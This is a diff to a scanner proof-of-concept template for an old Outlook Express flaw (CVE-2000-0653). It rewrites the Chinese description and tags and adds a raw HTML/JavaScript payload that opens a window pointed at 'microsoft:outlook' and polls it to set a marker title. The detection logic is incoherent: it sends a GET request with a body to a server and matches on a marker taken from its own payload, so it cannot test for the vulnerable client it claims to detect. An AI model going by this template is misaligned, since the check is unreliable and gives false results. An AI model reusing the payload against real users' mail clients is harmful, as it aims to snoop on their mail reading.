@@ -1,29 +1,29 @@
 [info]
 author = "ave"
-description = "Microsoft Outlook Express 持续邮件浏览器链接漏洞验证，通过特制 HTML 邮件中的 JavaScript 建立持久化浏览器链接，监视用户邮件内容"
+description = "通过发送特制HTML邮件，利用JavaScript在用户浏览器中创建与Outlook Express窗口的持久链接，监控用户邮件阅读活动。检测目标是否运行易受攻击的Outlook Express版本。"
 id = "POC-AVE-2000-0505"
-name = "CVE-2000-0653 Microsoft Outlook Express Persistent Mail-Browser Link PoC"
+name = "Microsoft Outlook Express 持续邮件浏览器链接信息泄露漏洞 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0653",
-    "outlook-express",
-    "information-disclosure",
-]
+tags = ["cve-2000-0653"]
 vuln_id = [
     "CVE-2000-0653",
     "AVE-2000-0505",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/{{BaseURL}}/poc.html"
 protocol = "http"
+
+[poc.requests.body]
+content = "<html><script>var w=window.open('','_blank');try{w.location='microsoft:outlook';setInterval(function(){try{if(w.document.body)document.title='VULN_CVE-2000-0653'}catch(e){}},500)}catch(e){}</script></html>"
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["Outlook Express"]
+words = ["VULN_CVE-2000-0653"]
